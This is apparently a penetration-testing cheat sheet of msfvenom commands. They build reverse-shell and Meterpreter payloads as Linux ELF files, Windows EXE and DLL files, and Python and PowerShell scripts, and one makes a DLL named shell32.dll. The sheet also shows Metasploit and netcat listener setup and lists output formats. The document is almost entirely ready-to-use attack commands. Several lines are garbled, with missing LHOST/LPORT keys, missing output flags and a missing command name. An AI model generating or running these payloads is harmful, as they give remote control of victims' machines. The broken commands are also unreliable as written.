### Inline Meterpreter
```
 msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=YourIP LPORT=YourPort -f elf  santas.elf
```

Windows
### Executable with Meterpreter

```
msfvenom -p  windows/meterpreter/reverse_tcp =YourIP =YourPort -f exe shell-meterp.exe
```

####
Executable with Windows cmd
```
 msfvenom -p windows/shell/reverse_tcp =YourIP =YourPort -f exe shell-cmd.exe
```



### Windows DLL with Windows cmd
```
 msfvenom -p windows/shell/reverse_tcp =YourIP =YourPort -f dll  shell-cmd.dll
```



### Execute Windows Command - generate dll named shell32.dll that will pop calc when ran
```
msfvenom -f dll -p windows/exec CMD="C:\windows\system32\calc.exe"-oshell32.dll
```


### Python
```
msfvenom -p cmd/unix/reverse_python LHOST=YourIP LPORT=YourPort -f raw
```


### Powershell
```
  windows/powershell_reverse_tcp LHOST=YourIP LPORT=YourPort -f raw
```


Payload Options
```
  --payload-options
 windows/meterpreter/reverse_tcp --payload-options
```

List encoders
```
root@kali:/# msfvenom -lencoders
```

#### shikata_gi_nai may throw an error on generation

In Metasploit set Listener for Windows Meterpreter
```
use exploit/multi/handler
payload windows/x64/meterpreter/reverse_tcp
```

####
In Metasploit set Listener for Linux Meterpreter
```
use exploit/multi/handler 
payload linux/x86/meterpreter/reverse_tcp
```

#### Set Netcat Listener
```
nc -lvpYourPort
```

#### Formats

Executable shell with an extension .elf .exe .py .php
Raw shellcode that can be pasted into an existing exploit. 

#### List of formats

```
msfvenom --help-formats
Executable formats
	asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
Transform formats
	bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
```




